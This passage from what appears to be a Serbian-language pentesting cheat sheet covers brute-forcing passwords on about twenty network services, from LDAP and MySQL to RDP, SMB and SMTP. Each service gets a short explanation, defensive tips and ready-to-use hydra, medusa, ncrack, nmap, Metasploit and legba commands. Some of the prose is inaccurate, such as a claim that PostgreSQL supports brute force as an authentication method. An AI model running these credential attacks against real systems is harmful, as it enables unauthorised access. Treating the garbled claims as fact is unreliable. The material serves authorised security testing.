jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP (Lightweight Directory Access Protocol) je protokol za pristupanje i upravljanje direktorijumima. Direktorijumi se koriste za čuvanje organizovanih informacija o korisnicima, grupama, resursima i drugim entitetima u mrežnom okruženju. LDAP se često koristi za autentifikaciju i autorizaciju korisnika u sistemima kao što su Active Directory.

#### Brute Force napadi na LDAP

Brute Force napadi na LDAP su tehnike kojima se pokušava otkriti ispravne kombinacije korisničkih imena i lozinki kako bi se neovlašćeno pristupilo LDAP direktorijumu. Ovi napadi se obično izvode pomoću automatizovanih alata koji automatski isprobavaju različite kombinacije korisničkih imena i lozinki sve dok ne pronađu ispravnu kombinaciju.

Da bi se izvršio Brute Force napad na LDAP, potrebno je imati listu korisničkih imena i lozinki koje će se isprobavati. Ova lista se može dobiti na različite načine, kao što su preuzimanje sa javno dostupnih baza podataka sa lozinkama ili korišćenje rečnika sa često korišćenim lozinkama.

Kako bi se sprečili Brute Force napadi na LDAP, preporučuje se primena odgovarajućih sigurnosnih mera kao što su:

- Korišćenje snažnih lozinki koje se redovno menjaju.
- Implementacija zaključavanja naloga nakon određenog broja neuspelih pokušaja prijavljivanja.
- Korišćenje dvofaktorne autentifikacije.
- Praćenje i analiza logova kako bi se otkrili sumnjivi pokušaji prijavljivanja.

Važno je napomenuti da je izvršavanje Brute Force napada na LDAP bez dozvole vlasnika sistema ilegalno i može imati ozbiljne pravne posledice. Ove tehnike se trebaju koristiti samo u okviru zakonskih i etičkih granica, kao deo legitimnih testiranja bezbednosti ili autorizovanih aktivnosti.
```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```
### MQTT

MQTT (Message Queuing Telemetry Transport) je protokol za komunikaciju koji je dizajniran za efikasno slanje poruka između uređaja u mreži. Ovaj protokol je posebno pogodan za IoT (Internet of Things) aplikacije, gde se često koriste uređaji sa ograničenim resursima.

MQTT koristi model izdavač-pretplatnik, gde uređaji mogu biti izdavači koji šalju poruke ili pretplatnici koji primaju poruke. Poruke se šalju na teme (topics), koje su hijerarhijski organizovane i omogućavaju selektivno slanje poruka samo određenim pretplatnicima.

Brute force napad na MQTT protokol se može izvesti pokušavajući sve moguće kombinacije korisničkih imena i lozinki kako bi se pristupilo MQTT brokeru. Ovaj napad može biti uspešan ako su korisnička imena i lozinke slabe ili su podložne lako pogodljivim kombinacijama.

Da bi se zaštitio MQTT protokol od brute force napada, preporučuje se korišćenje snažnih lozinki, ograničavanje broja neuspelih pokušaja prijavljivanja i implementacija dodatnih sigurnosnih mehanizama kao što su dvofaktorska autentifikacija ili IP ograničenja.
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```
### Mongo

Mongo je popularna baza podataka koja se često koristi u web aplikacijama. Kao i kod svake baze podataka, može biti meta napada brute force tehnikom. Brute force napad na Mongo bazu podataka se obično izvodi pomoću alata kao što su Hydra ili Nmap.

Da biste izvršili brute force napad na Mongo bazu podataka, prvo morate identifikovati IP adresu i port na kojem se baza podataka nalazi. Zatim možete koristiti alat poput Hydra da biste pokušali različite kombinacije korisničkih imena i lozinki sve dok ne pronađete ispravne kredencijale.

Kada izvršavate brute force napad na Mongo bazu podataka, važno je koristiti listu čestih korisničkih imena i lozinki, kao i kombinacije koje su specifične za aplikaciju koju napadate. Takođe, možete koristiti rečnike sajber kriminalaca koji sadrže veliki broj korisničkih imena i lozinki koje su ranije procurele.

Da biste se zaštitili od brute force napada na Mongo bazu podataka, preporučuje se da koristite jake lozinke koje se sastoje od kombinacije slova, brojeva i posebnih znakova. Takođe, možete koristiti alate za detekciju brute force napada koji će pratiti neobične aktivnosti i blokirati IP adrese koje pokušavaju da izvrše previše neuspelih pokušaja prijavljivanja.

Ukratko, brute force napad na Mongo bazu podataka je tehnika koja se koristi za pokušaj pronalaženja ispravnih korisničkih imena i lozinki. Kako biste se zaštitili od ovakvih napada, preporučuje se korišćenje jakih lozinki i alata za detekciju brute force napada.
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```
### MSSQL

MSSQL (Microsoft SQL Server) je popularni sistem za upravljanje bazama podataka koji se često koristi u poslovnom okruženju. Kao i kod drugih baza podataka, moguće je izvršiti napad brute force metodom kako bi se pokušalo saznati korisničko ime i lozinku za pristup MSSQL serveru.

#### Brute force napad na MSSQL

Brute force napad na MSSQL server se sastoji od pokušaja svih mogućih kombinacija korisničkih imena i lozinki sve dok se ne pronađe ispravna kombinacija koja omogućava pristup serveru. Ovaj napad može biti vrlo vremenski zahtevan, posebno ako je lozinka kompleksna i dugačka.

#### Alati za brute force napad na MSSQL

Postoji nekoliko alata koji se mogu koristiti za izvršavanje brute force napada na MSSQL server. Neki od popularnih alata uključuju:

- **Hydra**: Hydra je moćan alat za brute force napade koji podržava različite protokole, uključujući i MSSQL. Omogućava konfigurisanje različitih opcija, kao što su lista korisničkih imena i lozinki koje će se koristiti za napad.

- **Medusa**: Medusa je još jedan alat za brute force napade koji podržava MSSQL protokol. Ovaj alat takođe omogućava konfigurisanje različitih opcija, kao što su lista korisničkih imena i lozinki.

#### Zaštita od brute force napada na MSSQL

Da bi se zaštitio MSSQL server od brute force napada, preporučuje se preduzimanje sledećih mera:

- **Snažne lozinke**: Koristite snažne lozinke koje kombinuju različite karakteristike, kao što su velika i mala slova, brojevi i posebni znakovi. Takođe, redovno menjajte lozinke kako biste otežali napadačima da ih pogode.

- **Blokiranje IP adresa**: Konfigurišite MSSQL server da automatski blokira IP adrese koje su izvršile određeni broj neuspelih pokušaja prijavljivanja. Ovo će otežati napadačima da nastave sa brute force napadom.

- **Višestruki faktori autentifikacije**: Omogućite višestruke faktore autentifikacije za pristup MSSQL serveru. Ovo će dodatno otežati napadačima da dobiju pristup čak i ako uspeju da pogode ispravnu kombinaciju korisničkog imena i lozinke.

#### Zaključak

Brute force napad na MSSQL server može biti efikasan način za dobijanje neovlašćenog pristupa. Međutim, preduzimanje odgovarajućih mera zaštite može značajno smanjiti rizik od uspešnog napada.
```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```
### MySQL

MySQL je popularni open-source sistem za upravljanje bazama podataka koji se često koristi u web aplikacijama. Brute force napad na MySQL bazu podataka podrazumeva pokušaj da se pronađe ispravna kombinacija korisničkog imena i lozinke kako bi se dobio neovlašćen pristup bazi podataka.

#### Metode Brute Force napada na MySQL

1. **Dictionary Attack (Rečnik napad)**: Ova metoda uključuje pokušaj svih mogućih kombinacija lozinki iz predefinisanog rečnika. Rečnik može sadržati česte lozinke, reči iz rečnika, kombinacije brojeva i slova, kao i varijacije lozinki koje se često koriste.

2. **Brute Force Attack (Nasilnički napad)**: Ova metoda uključuje pokušaj svih mogućih kombinacija karaktera za korisničko ime i lozinku. Ova metoda je najsporija, ali je najefikasnija jer ne zavisi od predefinisanog rečnika.

3. **Hybrid Attack (Hibridni napad)**: Ova metoda kombinuje rečnik napad i nasilnički napad. Prvo se koristi rečnik napad, a zatim se prelazi na nasilnički napad ako rečnik ne uspe da pronađe ispravnu kombinaciju.

#### Prevencija Brute Force napada na MySQL

Da biste sprečili Brute Force napade na MySQL bazu podataka, možete preduzeti sledeće mere:

- **Snažne lozinke**: Koristite snažne lozinke koje kombinuju velika i mala slova, brojeve i posebne znakove. Izaberite lozinke koje su teške za pogoditi i izbegavajte korišćenje uobičajenih reči ili fraza.

- **Ograničenje broja pokušaja**: Postavite ograničenje broja pokušaja prijavljivanja kako biste sprečili napadače da izvrše veliki broj pokušaja.

- **Dvosmerna autentifikacija**: Omogućite dvosmernu autentifikaciju kako biste dodatno zaštitili pristup bazi podataka.

- **Monitorisanje logova**: Redovno pratite logove kako biste otkrili sumnjive aktivnosti i preduzeli odgovarajuće mere.

- **Ažuriranje softvera**: Redovno ažurirajte MySQL softver kako biste ispravili poznate sigurnosne propuste i ranjivosti.

- **IP ograničenje**: Ograničite pristup MySQL bazi podataka samo na određene IP adrese kako biste smanjili rizik od neovlašćenog pristupa.

- **Koristite sigurnosne grupe**: Konfigurišite sigurnosne grupe kako biste ograničili pristup MySQL bazi podataka samo na određene korisnike i IP adrese.

- **Koristite enkripciju**: Koristite enkripciju za zaštitu podataka koji se prenose između MySQL servera i klijenta.

- **Redovno pravljenje rezervnih kopija**: Redovno pravite rezervne kopije MySQL baze podataka kako biste se zaštitili od gubitka podataka u slučaju napada.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```
### OracleSQL

OracleSQL je programski jezik koji se koristi za upravljanje Oracle bazama podataka. Može se koristiti za izvršavanje različitih operacija nad bazom podataka, kao što su upiti, unos podataka, ažuriranje i brisanje podataka.

#### Brute Force napadi na OracleSQL

Brute Force napadi su tehnike koje se koriste za pokušaj otkrivanja lozinke ili korisničkog imena tako što se sistem napada pokušajem svih mogućih kombinacija. Ovi napadi se mogu koristiti i na OracleSQL bazama podataka kako bi se pokušalo otkriti lozinke korisnika ili administratora.

Da bi se izvršio Brute Force napad na OracleSQL, koristi se alat koji automatski generiše i pokušava sve moguće kombinacije lozinki. Ovaj proces može biti vremenski zahtevan, posebno ako je lozinka kompleksna i dugačka.

#### Zaštita od Brute Force napada

Da bi se zaštitili od Brute Force napada na OracleSQL bazu podataka, preporučuje se primena sledećih mera:

1. Korišćenje snažnih lozinki: Korisnici trebaju koristiti složene lozinke koje kombinuju velika i mala slova, brojeve i posebne znakove. Lozinke treba redovno menjati i ne smeju biti lako pogodljive.

2. Blokiranje IP adresa: Može se konfigurisati OracleSQL baza podataka da blokira IP adrese koje su izvršile određeni broj neuspelih pokušaja prijavljivanja. Ovo može pomoći u sprečavanju Brute Force napada.

3. Višestruki faktori autentifikacije: Korišćenje višestrukih faktora autentifikacije, kao što su lozinka i jednokratni kod, može dodatno otežati Brute Force napade.

4. Praćenje logova: Praćenje logova može pomoći u otkrivanju Brute Force napada i identifikaciji potencijalnih ranjivosti u sistemu.

5. Ograničenje broja pokušaja prijavljivanja: Može se postaviti ograničenje na broj pokušaja prijavljivanja kako bi se sprečili Brute Force napadi. Nakon određenog broja neuspelih pokušaja, korisnik ili IP adresa mogu biti privremeno blokirani.

Implementacija ovih mera može značajno smanjiti rizik od Brute Force napada na OracleSQL bazu podataka.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```
Da biste koristili **oracle\_login** sa **patator**-om, morate **instalirati**:
```bash
pip3 install cx_Oracle --upgrade
```
[Offline OracleSQL hash bruteforce](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**verzije 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** i **11.2.0.3**):
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

POP (Post Office Protocol) je protokol za prijem elektronske pošte. POP se koristi za preuzimanje poruka sa servera e-pošte na lokalni uređaj. 

#### Brute Force napad na POP

Brute Force napad na POP je tehnika koja se koristi za pokušaj otkrivanja lozinke za pristup POP serveru. Ova tehnika uključuje automatsko isprobavanje različitih kombinacija lozinki sve dok se ne pronađe ispravna lozinka. 

Da bi se izvršio Brute Force napad na POP, potrebno je koristiti alat koji može automatski generisati i testirati veliki broj lozinki. Ovaj alat može biti program ili skripta koja koristi rečnike sa različitim kombinacijama lozinki. 

Važno je napomenuti da je Brute Force napad na POP oblik napada na snagu lozinke. To znači da je uspeh ovog napada zavisan od dužine i složenosti lozinke. Što je lozinka duža i složenija, to je manja verovatnoća da će Brute Force napad biti uspešan. 

Da bi se zaštitili od Brute Force napada na POP, preporučuje se korišćenje jakih lozinki koje kombinuju različite karakteristike kao što su velika i mala slova, brojevi i posebni znakovi. Takođe je važno redovno menjati lozinke i koristiti dvofaktornu autentifikaciju ako je moguće.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```
### PostgreSQL

PostgreSQL je moćan objektno-relacioni sistem za upravljanje bazama podataka. Ovaj sistem podržava različite metode autentifikacije, uključujući i brute force napade. Brute force napad je tehnika koja se koristi za pokušaj otkrivanja lozinke tako što se sistem napada pokušajem svih mogućih kombinacija lozinki.

Da biste izvršili brute force napad na PostgreSQL, možete koristiti alate kao što su Hydra, Medusa ili Patator. Ovi alati omogućavaju automatizovano isprobavanje različitih kombinacija korisničkih imena i lozinki sve dok se ne pronađe ispravna kombinacija.

Kada izvršavate brute force napad, važno je da imate listu mogućih korisničkih imena i lozinki koje želite isprobati. Takođe, trebali biste biti oprezni i ne preopteretiti sistem brute force napadima, jer to može dovesti do blokiranja vaše IP adrese ili drugih sigurnosnih mera.

PostgreSQL takođe ima mehanizme zaštite od brute force napada, kao što je postavljanje ograničenja broja neuspelih pokušaja prijavljivanja ili korišćenje CAPTCHA zaštite. Ovi mehanizmi mogu otežati izvršavanje brute force napada, ali ne garantuju potpunu zaštitu.

Važno je napomenuti da je izvršavanje brute force napada bez dozvole vlasnika sistema ilegalno i može imati ozbiljne pravne posledice. Uvek se pridržavajte zakona i etičkih smernica prilikom izvođenja bilo kakvih hakovanja ili testiranja sigurnosti.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```
### PPTP

Možete preuzeti `.deb` paket za instalaciju sa [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

RDP (Remote Desktop Protocol) je protokol koji omogućava udaljeni pristup i upravljanje udaljenim računarima. Brute force napad na RDP se odnosi na pokušaj otkrivanja korisničkih imena i lozinki za pristup RDP serverima. Ovaj napad se obično izvodi pomoću automatizovanih alata koji pokušavaju različite kombinacije korisničkih imena i lozinki sve dok ne pronađu ispravne podatke za prijavu.

Da biste izvršili brute force napad na RDP, možete koristiti alate kao što su Hydra, Medusa ili RDPY. Ovi alati omogućavaju automatsko isprobavanje različitih kombinacija korisničkih imena i lozinki na ciljnom RDP serveru.

Kako biste povećali šanse za uspeh brute force napada na RDP, možete koristiti rečnike lozinki koji sadrže širok spektar mogućih kombinacija. Takođe, možete koristiti tehniku "password spraying" koja podrazumeva isprobavanje nekoliko često korišćenih lozinki na više korisničkih naloga.

Važno je napomenuti da je brute force napad na RDP nelegalan i može imati ozbiljne pravne posledice. Uvek se pridržavajte zakona i etičkih smernica prilikom izvođenja bilo kakvih aktivnosti vezanih za hakovanje.
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```
### Redis

Redis je open-source, brzi i skalabilni sistem za skladištenje podataka. Koristi se za skladištenje i upravljanje različitim vrstama podataka, uključujući ključ-vrednost, liste, skupove, redove i hash mape. Redis takođe podržava različite operacije nad podacima, kao što su dodavanje, brisanje, ažuriranje i pretraga.

Kada je u pitanju brute force napad na Redis, postoje nekoliko metoda koje se mogu koristiti. Jedna od najčešćih metoda je pokušaj svih mogućih kombinacija lozinki dok se ne pronađe ispravna. Ova metoda se naziva i "brute force" jer se oslanja na snagu računara da proba sve moguće kombinacije.

Da biste izvršili brute force napad na Redis, možete koristiti alate kao što su Hydra ili Medusa. Ovi alati omogućavaju automatizovano isprobavanje različitih kombinacija lozinki sve dok se ne pronađe ispravna. Važno je napomenuti da je brute force napad ilegalan i može imati ozbiljne pravne posledice.

Da biste se zaštitili od brute force napada na Redis, preporučuje se korišćenje snažnih lozinki koje se teško mogu pogoditi. Takođe je važno redovno ažurirati Redis na najnoviju verziju kako bi se ispravile poznate sigurnosne propuste. Dodatno, možete koristiti alate za detekciju i sprečavanje brute force napada, kao što su fail2ban ili ograničavanje broja pokušaja prijavljivanja.
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```
### Rexec

Rexec (Remote Execution) je protokol koji omogućava izvršavanje komandi na udaljenom računaru. Ovaj protokol se često koristi za administrativne svrhe, ali može biti iskorišćen i za zlonamerne aktivnosti.

Da bi se izvršila brute force napad na rexec, potrebno je pretpostaviti korisničko ime i lozinku. Napadač može koristiti različite tehnike za generisanje kombinacija korisničkih imena i lozinki, kao što su rečnici, kombinacije karaktera ili algoritmi za generisanje.

Napadač može koristiti alate kao što su Hydra ili Medusa za izvršavanje brute force napada na rexec. Ovi alati automatski generišu i testiraju kombinacije korisničkih imena i lozinki sve dok ne pronađu ispravne kredencijale.

Da bi se zaštitili od brute force napada na rexec, preporučuje se korišćenje snažnih lozinki, ograničavanje broja neuspelih pokušaja prijavljivanja i implementacija sistema za detekciju i sprečavanje napada. Takođe je važno redovno ažurirati softver i pratiti sigurnosne propuste koji mogu biti iskorišćeni za napade.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin (Remote Login) je mrežni protokol koji omogućava korisnicima da se udaljeno prijave na drugi računar u mreži. Ovaj protokol se često koristi za administrativne svrhe, kao što je upravljanje udaljenim računarima ili prenos datoteka. 

Brute force napad na Rlogin protokol se može izvesti pokušavajući različite kombinacije korisničkih imena i lozinki sve dok se ne pronađe ispravna kombinacija. Ovaj napad može biti uspešan ako se koriste slabe lozinke ili ako se ne primenjuju mere zaštite kao što su zaključavanje naloga nakon određenog broja neuspelih pokušaja prijave. 

Da biste izveli brute force napad na Rlogin, možete koristiti alate kao što su Hydra ili Medusa. Ovi alati automatski pokušavaju različite kombinacije korisničkih imena i lozinki sve dok ne pronađu ispravnu kombinaciju. Važno je napomenuti da je brute force napad nelegalan, osim ako se izvodi na sopstvenim sistemima ili uz dozvolu vlasnika sistema.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh (Remote Shell) je protokol za udaljeno izvršavanje komandi na udaljenom računaru. Ovaj protokol se često koristi za automatizaciju administrativnih zadataka i upravljanje udaljenim sistemima. Međutim, Rsh protokol ima ozbiljne sigurnosne nedostatke i nije preporučljivo koristiti ga u proizvodnom okruženju.

Brute force napad na Rsh protokol se može izvesti pokušavajući različite kombinacije korisničkih imena i lozinki sve dok se ne pronađe ispravna kombinacija koja omogućava pristup udaljenom računaru. Ovaj napad se može izvesti pomoću alata kao što su Hydra ili Medusa.

Da biste izvršili brute force napad na Rsh protokol, potrebno je identifikovati ciljani sistem i odabrati listu potencijalnih korisničkih imena i lozinki. Zatim, alat za brute force se konfiguriše da automatski pokušava sve kombinacije iz liste sve dok ne pronađe ispravnu kombinaciju.

Važno je napomenuti da je brute force napad nelegalan i može imati ozbiljne pravne posledice. Ovaj metod se može koristiti samo u okviru zakonitog testiranja penetracije ili sa odobrenjem vlasnika sistema.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

Rsync je alat za sinhronizaciju i prenos podataka između računara. Može se koristiti za kopiranje i ažuriranje fajlova i direktorijuma preko mreže. Rsync koristi efikasne algoritme za prenos samo promenjenih delova fajlova, što ga čini veoma korisnim za brzi prenos velikih količina podataka. Takođe podržava enkripciju prenosa podataka putem SSH protokola. Rsync se često koristi u sistemskom administriranju i backup procesima.
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

RTSP (Real Time Streaming Protocol) je protokol za prenos multimedijalnih sadržaja u realnom vremenu preko IP mreže. Ovaj protokol se često koristi za strimovanje video i audio sadržaja sa IP kamera, video servera i drugih uređaja koji podržavaju RTSP.

#### Brute Force napadi na RTSP

Brute Force napadi na RTSP se koriste za pokušaj otkrivanja korisničkih imena i lozinki za pristup RTSP serverima. Ovi napadi se obično izvode pomoću alata za automatsko testiranje, kao što je Hydra, koji pokušava različite kombinacije korisničkih imena i lozinki sve dok ne pronađe ispravne kredencijale.

Da biste izvršili Brute Force napad na RTSP server, potrebno je identifikovati ciljni server i odabrati listu potencijalnih korisničkih imena i lozinki. Zatim se koristi alat za Brute Force napade, kao što je Hydra, koji će automatski pokušavati sve kombinacije korisničkih imena i lozinki dok ne pronađe ispravne kredencijale.

Napomena: Brute Force napadi su nelegalni i mogu dovesti do pravnih posledica. Ove tehnike se smeju koristiti samo u okviru zakonitog testiranja penetracije ili sa dozvolom vlasnika sistema.
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SFTP

SFTP (Secure File Transfer Protocol) je siguran protokol za prenos datoteka koji koristi kriptografske tehnike za zaštitu podataka tokom prenosa. SFTP se često koristi za prenos osetljivih informacija, kao što su lozinke, finansijski podaci i drugi poverljivi podaci.

Brute force napad na SFTP server se može izvesti pokušavajući različite kombinacije korisničkih imena i lozinki sve dok se ne pronađe ispravna kombinacija koja omogućava pristup serveru. Ovaj napad može biti vremenski zahtevan, ali može biti uspešan ako su korisnička imena i lozinke slabe ili su podložne lako pogodljivim kombinacijama.

Da biste izvršili brute force napad na SFTP server, možete koristiti alate kao što su Hydra, Medusa ili Patator. Ovi alati automatski pokušavaju različite kombinacije korisničkih imena i lozinki sve dok ne pronađu ispravnu kombinaciju. Važno je napomenuti da je brute force napad nelegalan, osim ako nemate izričitu dozvolu vlasnika servera za izvođenje ovog napada u okviru etičkog hakovanja ili testiranja penetracije.

Da biste smanjili rizik od brute force napada na SFTP server, preporučuje se korišćenje snažnih lozinki koje kombinuju različite vrste karaktera (velika slova, mala slova, brojevi, posebni znakovi) i redovno menjanje lozinki. Takođe je važno koristiti višefaktorsku autentifikaciju koja zahteva dodatnu verifikaciju, poput SMS koda ili biometrijskih podataka, kako bi se otežao neovlašćeni pristup serveru.
```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
### SNMP

SNMP (Simple Network Management Protocol) je protokol koji se koristi za upravljanje i nadzor mrežnih uređaja. Ovaj protokol omogućava administratorima da prikupljaju informacije o statusu i performansama mreže, kao i da upravljaju mrežnim uređajima.

SNMP koristi koncept agenata i upravljača. Agenti su softverski moduli koji se izvršavaju na mrežnim uređajima i prikupljaju informacije o njihovom statusu. Upravljači su softverski alati koji se koriste za nadzor i upravljanje mrežnim uređajima putem SNMP protokola.

Brute force napad na SNMP se može izvesti pokušavajući sve moguće kombinacije zajedničke zajednice (community string) kako bi se pristupilo SNMP agentu. Zajednica je vrsta lozinke koja se koristi za autentifikaciju i autorizaciju pristupa SNMP agentu.

Da bi se izvršio brute force napad na SNMP, koriste se alati kao što su SNMP Brute i SNMP-Brute. Ovi alati automatski generišu i testiraju različite kombinacije zajedničke zajednice kako bi pristupili SNMP agentu.

Da bi se zaštitili od brute force napada na SNMP, preporučuje se korišćenje snažnih i složenih zajedničkih zajednica, kao i ograničavanje pristupa SNMP agentu samo na određene IP adrese. Takođe je važno redovno ažurirati softver na mrežnim uređajima kako bi se ispravile poznate sigurnosne ranjivosti.
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

SMB (Server Message Block) je protokol za deljenje datoteka i štampanje koji se često koristi u Windows okruženjima. Ovaj protokol omogućava korisnicima da pristupe i deluju sa resursima na udaljenim računarima, kao što su datoteke, štampači i mrežni uređaji. 

Brute force napad na SMB protokol se može izvesti pomoću alata kao što su Hydra, Medusa ili smbmap. Ovi alati omogućavaju napadačima da automatski isprobaju različite kombinacije korisničkih imena i lozinki kako bi pristupili SMB resursima. 

Da bi se izvršio uspešan brute force napad na SMB, napadač mora imati listu potencijalnih korisničkih imena i lozinki. Ova lista se može dobiti putem različitih izvora, kao što su procurele baze podataka, socijalno inženjering ili prethodno prikupljeni podaci o korisnicima. 

Napadači takođe mogu koristiti različite tehnike za poboljšanje efikasnosti brute force napada na SMB. Na primer, mogu koristiti rečnike sa najčešće korišćenim lozinkama, kombinovati različite rečnike ili koristiti tehnike kao što su "password spraying" ili "credential stuffing". 

Važno je napomenuti da je brute force napad na SMB nelegalan i može imati ozbiljne pravne posledice. Ova tehnika se može koristiti samo u okviru zakonitog testiranja penetracije ili sa odobrenjem vlasnika sistema.
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```
### SMTP

SMTP (Simple Mail Transfer Protocol) je standardni protokol za slanje elektronske pošte preko interneta. Ovaj protokol se često koristi za slanje i prijem poruka putem e-pošte.

#### Brute Force napad na SMTP

Brute Force napad na SMTP je tehnika koja se koristi za pokušaj otkrivanja lozinke za pristup SMTP serveru. Ovaj napad se zasniva na pokušaju svih mogućih kombinacija lozinki sve dok se ne pronađe ispravna lozinka.

Da biste izvršili Brute Force napad na SMTP, možete koristiti različite alate i tehnike, kao što su:

- **Hydra**: Alat za Brute Force napade koji podržava različite protokole, uključujući SMTP.
- **Medusa**: Alat za Brute Force napade koji takođe podržava različite protokole, uključujući SMTP.
- **Ncrack**: Alat za Brute Force napade koji je posebno dizajniran za mrežne protokole, uključujući SMTP.

Prilikom izvođenja Brute Force napada na SMTP, važno je uzeti u obzir nekoliko faktora kako biste povećali šanse za uspeh:

- **Rečnik lozinki**: Koristite rečnik lozinki koji sadrži širok spektar mogućih kombinacija.
- **Brzina napada**: Podesite brzinu napada tako da ne izazivate sumnju ili blokadu na ciljnom SMTP serveru.
- **Blokiranje IP adrese**: Budite svesni da neki SMTP serveri mogu blokirati IP adrese koje izvršavaju Brute Force napade.

Važno je napomenuti da je Brute Force napad na SMTP nelegalan, osim ako se izvodi u okviru zakonitog testiranja penetracije ili sa odobrenjem vlasnika sistema. Uvek se pridržavajte zakona i etičkih smernica prilikom izvođenja bilo kakvih hakeraških aktivnosti.
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```
### SOCKS

SOCKS (Socket Secure) je protokol koji omogućava korisnicima da uspostave sigurnu vezu preko proxy servera. Ovaj protokol omogućava preusmeravanje mrežnog saobraćaja kroz proxy server, čime se obezbeđuje anonimnost i zaštita privatnosti korisnika. 

Brute force napad na SOCKS proxy server se može izvesti pomoću različitih alata i tehnika. Jedan od najčešćih načina je korišćenje alata poput Hydra ili Medusa, koji omogućavaju automatsko isprobavanje različitih kombinacija korisničkih imena i lozinki kako bi se pronašli validni pristupni podaci. 

